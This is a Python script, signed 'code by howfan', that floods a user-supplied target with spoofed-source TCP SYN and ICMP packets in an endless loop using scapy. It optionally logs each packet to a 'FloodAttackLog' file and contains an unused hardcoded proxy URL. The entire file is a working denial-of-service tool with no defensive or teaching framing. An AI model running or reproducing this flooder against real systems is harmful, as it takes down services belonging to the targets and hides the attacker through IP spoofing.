#code by howfan
import sys, random
from scapy.all import send, IP, TCP, ICMP
print('\33[34m' + "code by howfan" + '\33[31m')
n = 0
tar = input("input target : ")
print('\33[95m' + "set target " + '\33[92m' + str(tar) + '\33[95m')
output = input("output a file? [y/n] : ")
if str(output) == "y":
    filename = "FloodAttackLog_'" + str(tar) + "'"
    f = open(str(filename) + ".txt", "a")
else:
    n = n
while True:
    psrc = str(random.randint(1, 254)) + "." + str(random.randint(1, 254)) + "." + str(random.randint(1, 254)) + "." + str(random.randint(1, 254))
    pdst = tar
    #SYN
    send(IP(src = psrc, dst = pdst) / TCP(dport = 80, flags="S"))
    n+=1
    print('\33[95m' + "send " + '\33[92m' + "SYN  " +'\33[31m' + str(n) + '\33[95m')
    if str(output) == "y":
        f.write("".join(str(psrc)))
        f.write("".join(" send SNY to "))
        f.write("".join(str(tar)))
        f.write("".join("\n"))
    else:
        n = n
    psrc2 = str(random.randint(1, 254)) + "." + str(random.randint(1, 254)) + "." + str(random.randint(1, 254)) + "." + str(random.randint(1, 254))
    proxy = "http://117.177.243.71:86/"
    send(IP(src = psrc2, dst = pdst) / ICMP())
    n+=1
    print('\33[95m' + "send " + '\33[92m' + "ICMP " + '\33[31m' + str(n) + '\33[95m')
    if str(output) == "y":
        f.write("".join(str(psrc2)))
        f.write("".join(" send ICMP to "))
        f.write("".join(str(tar)))
        f.write("".join("\n"))
    else:
        n = n
